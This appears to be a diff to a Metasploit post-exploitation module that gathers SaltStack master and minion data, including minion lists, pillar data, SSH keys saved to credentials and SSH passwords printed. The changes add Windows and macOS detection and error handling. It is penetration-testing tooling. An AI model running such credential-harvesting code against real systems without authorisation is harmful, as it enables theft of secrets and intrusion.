@@ -17,11 +17,12 @@ class MetasploitModule < Msf::Post
           This module gathers information from SaltStack masters and minions.
           Data gathered from minions: 1. salt minion config file
           Data gathered from masters: 1. minion list (denied, pre, rejected, accepted)
-            2. minion hostname/ip/os (depending on module settings)
-            3. SLS
-            4. roster, any SSH keys are retrieved and saved to creds, SSH passwords printed
-            5. minion config files
-            6. pillar data},
+          2. minion hostname/ip/os (depending on module settings)
+          3. SLS
+          4. roster, any SSH keys are retrieved and saved to creds, SSH passwords printed
+          5. minion config files
+          6. pillar data
+        },
         'Author' => [
           'h00die',
           'c2Vlcgo'
@@ -65,12 +66,17 @@ class MetasploitModule < Msf::Post
       command << 'network.interfaces'
     end
     if datastore['GETOS']
-      command << 'status.version'
+      command << 'status.version' # seems to work on linux
+      command << 'system.get_system_info' # seems to work on windows, part of salt.modules.win_system
     end
     commas = ',' * (command.length - 1) # we need to provide empty arguments for each command
     command = "salt '#{datastore['MINIONS']}' --output=yaml #{command.join(',')} #{commas}"
     begin
       out = cmd_exec(command)
+      if out == '' || out.nil?
+        print_error('No results returned. Possible timeout, try again later, or try fewer GET* commands at once')
+        return
+      end
       vprint_status(out)
       results = YAML.safe_load(out, [Symbol]) # during testing we discovered at times Symbol needs to be loaded
       store_path = store_loot('saltstack_minion_data_gather', 'application/x-yaml', session, results.to_yaml, 'minion_data_gather.yaml', 'SaltStack Minion Data Gather')
@@ -79,7 +85,7 @@ class MetasploitModule < Msf::Post
       print_error('Unable to process gather command output')
       return
     end
-    return if results == false
+    return if results == false || results.nil?
     return if results.include?('Salt request timed out.')
 
     results.each do |_key, result|
@@ -88,8 +94,20 @@ class MetasploitModule < Msf::Post
         os_flavor: result['status.version'],
         comments: "SaltStack minion to #{session.session_host}"
       }
+      # mac os
+      if result['system.get_system_info'].include?('Traceback') && result['status.version'].include?('unsupported on the current operating system')
+        host_info[:os_name] = 'osx' # taken from lib/msf/core/post/osx/system
+      # windows will throw a traceback error for status.version
+      elsif result['status.version'].include? 'Traceback'
+        info = result['system.get_system_info']
+        host_info[:os_name] = info['os_name']
+        host_info[:os_flavor] = info['os_version']
+        host_info[:purpose] = info['os_type']
+      end
       result['network.interfaces'].each do |name, interface|
         next if name == 'lo'
+        next if interface['hwaddr'] == ':::::' # Windows Software Loopback Interface
+        next unless interface.key? 'inet' # skip if it doesn't have an inet, macos had lots of this
 
         host_info[:mac] = interface['hwaddr']
         host_info[:host] = interface['inet'][0]['address'] # ignoring inet6
@@ -99,7 +117,7 @@ class MetasploitModule < Msf::Post
     end
   end
 
-  def get_minions
+  def list_minions
     # pull minions from a master
     print_status('Attempting to list minions')
     unless command_exists?('salt-key')
@@ -144,7 +162,7 @@ class MetasploitModule < Msf::Post
     [
       '/usr/local/etc/salt/minion', # freebsd
       '/etc/salt/minion'
-    ]. each do |config|
+    ].each do |config|
       next unless file?(config)
 
       minion = YAML.safe_load(read_file(config))
@@ -157,7 +175,7 @@ class MetasploitModule < Msf::Post
   end
 
   def master
-    get_minions
+    list_minions
     gather_minion_data if datastore['GETOS'] || datastore['GETHOSTNAME'] || datastore['GETIP']
 
     # get sls files
